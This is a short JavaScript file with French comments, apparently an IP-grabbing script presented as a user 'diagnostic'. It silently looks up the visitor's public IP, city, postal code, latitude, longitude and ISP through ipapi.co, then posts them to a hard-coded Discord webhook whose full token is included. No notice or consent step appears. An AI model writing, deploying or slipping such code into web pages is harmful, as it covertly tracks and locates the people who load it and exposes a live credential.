const webhookURL = "https://discord.com/api/webhooks/1361789315868397609/k6EYXeGKbwCSaJJF7p7OQxj12QnJKrHHhuFxyZ6Jj-gcgjK2hBuJsKNhjR6JI0xstR2B";

let diagnostic = "=== Diagnostic du user ===\n";

diagnostic += `En ligne : ${navigator.onLine ? "Oui" : "Non"}\n`;

diagnostic += `Fuseau horaire : ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;

// IP publique + localisation (via ipapi.co)
try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    diagnostic += `IP Publique : ${data.ip}\n`;
    diagnostic += `Ville : ${data.city}\n`;
    diagnostic += `Région : ${data.region}\n`;
    diagnostic += `Pays : ${data.country_name}\n`;
    diagnostic += `Code Postal : ${data.postal}\n`;
    diagnostic += `Latitude : ${data.latitude}\n`;
    diagnostic += `Longitude : ${data.longitude}\n`;
    diagnostic += `Fournisseur Internet : ${data.org}\n`;
} catch (e) {
    diagnostic += "Erreur lors de la récupération de l'IP/localisation\n";
}


const data = {
  content: diagnostic ,
  username: "Flkprod",
};

fetch(webhookURL, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(data),
})
  .then((res) => {
    if (res.ok) {
    } else {
      console.error("Erreur :", res.statusText);
    }
  })
  .catch((err) => console.error("Erreur Fetch :", err));
